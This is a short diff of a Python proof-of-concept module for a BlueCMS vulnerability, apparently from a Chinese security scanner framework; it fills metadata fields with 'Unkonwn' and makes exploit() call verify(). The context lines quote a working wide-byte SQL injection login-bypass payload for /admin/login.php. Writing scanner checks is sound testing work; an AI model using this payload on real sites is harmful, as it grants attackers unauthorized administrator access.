@@ -13,11 +13,11 @@ class Vuln(ABVuln):
         BlueCMS /admin/login.php 双字节万能密码进后台：
         admin_name=hentai%d5%27%20or%201%3d1%23&admin_pwd=hentai&submit=%B5%C7%C2%BC&act=do_login
     '''  # 漏洞描述
-    ref = ''  # 漏洞来源
-    cnvd_id = ''  # cnvd漏洞编号
-    cve_id = ''  # cve编号
+    ref = 'Unkonwn'  # 漏洞来源
+    cnvd_id = 'Unkonwn'  # cnvd漏洞编号
+    cve_id = 'Unkonwn'  # cve编号
     product = 'BlueCMS'  # 漏洞应用名称
-    product_version = ''  # 漏洞应用版本
+    product_version = 'Unkonwn'  # 漏洞应用版本
 
 class Poc(ABPoc):
     poc_id = '6bde6438-c512-4e18-a7d1-eb381e56675a'
@@ -48,7 +48,7 @@ class Poc(ABPoc):
             self.output.info('执行异常{}'.format(e))
 
     def exploit(self):
-        super(Poc, self).exploit()
+        self.verify()
 
 if __name__ == '__main__':
     Poc().run()
